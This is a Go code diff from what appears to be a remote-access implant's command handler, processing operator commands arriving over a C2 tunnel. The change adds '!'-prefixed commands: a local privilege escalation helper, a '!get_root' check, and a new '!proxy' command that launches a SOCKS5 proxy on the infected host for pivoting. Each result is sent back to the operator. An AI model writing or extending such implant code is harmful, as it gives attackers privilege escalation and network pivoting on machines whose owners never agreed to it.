@@ -87,15 +87,35 @@ func processCCData(data *MsgTunData) {
 			goto send
 		}
 
+		/*
+			!command: special commands
+		*/
+
 		// LPE helper
-		if strings.HasPrefix(cmdSlice[0], "lpe_") {
-			out = lpeHelper(cmdSlice[0])
+		if strings.HasPrefix(cmdSlice[0], "!lpe_") {
+			helper := strings.TrimPrefix(cmdSlice[0], "!")
+			out = lpeHelper(helper)
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
+		}
+
+		// proxy server
+		if cmdSlice[0] == "!proxy" {
+			if len(cmdSlice) != 2 {
+				log.Printf("args error: %v", cmdSlice)
+				return
+			}
+			err = Socks5Proxy(cmdSlice[1])
+			out = fmt.Sprintf("Success")
+			if err != nil {
+				out = fmt.Sprintf("Failed to execute your command: %v", err)
+			}
 			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
 			goto send
 		}
 
 		// get_root
-		if cmdSlice[0] == "get_root" {
+		if cmdSlice[0] == "!get_root" {
 			if os.Geteuid() == 0 {
 				out = "You already have root!"
 			} else {
